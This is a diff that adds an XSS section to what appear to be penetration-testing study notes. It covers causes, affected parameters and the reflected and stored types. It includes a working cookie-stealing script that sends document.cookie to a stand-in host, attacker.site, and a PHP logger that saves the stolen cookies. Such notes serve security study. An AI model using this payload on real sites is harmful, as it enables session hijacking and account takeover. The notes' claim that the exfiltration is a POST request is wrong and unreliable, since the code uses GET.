@@ -629,4 +629,52 @@ Operators:
 - `AND`, `OR`, `&`, `|` - Logical operators that can be thrown into search query as well.
 - `-` - Can be used to filter **out** keywords from the results.
 
+### 4.1.4: Cross Site Scripting (XSS)
+Allows attackers to control web app content.
+- Modify contents of site at runtime
+- Inject malicious content
+- Steal user session cookies
+- Perform actions masquerading as a legitimate user
+
+How vulns occur:
+- Unfiltered user input is trusted and NOT verified server-side.
+- User input is used to build output content
+
+Parameters that can be used for XSS:
+- Request headers
+- Cookies
+- Form inputs
+- POST parameters
+- GET parameters
+
+Types of XSS:
+- Reflected: Inputs cause an immediate change in an output page, ie the effects are immediately reflected back to the actor.
+	- Places to look: Searchbars.
+	- Can be mitigated by reflected XSS filters.
+- Stored: Inputs are stored, and the content persists among different sessions.
+	- Places to look: Form submissions, comments.
+
+Stealing Cookies:
+- Can happen if `HttpOnly` flag is not enabled.
+- Uses JavaScript
+- Test: `<script>alert(document.cookie)</script>
+``` javascript
+<script>
+var i = new Image();
+i.src="http://attacker.site/log.php?q="+document.cookie;
+</script>
+```
+> Makes a POST request to a a php log because victim site points request to attacker site to load image.
+
+``` php
+<?php
+$filename="/tmp/log.txt";
+$fp=fopen($filename, 'a');
+$cookie=$_GET['q'];
+fwrite($fp, $cookie);
+fclose($fp);
+?>
+```
+> Listener on attacker site that will log the cookie sent to it via the POST request.
+
 ## 5. Reporting
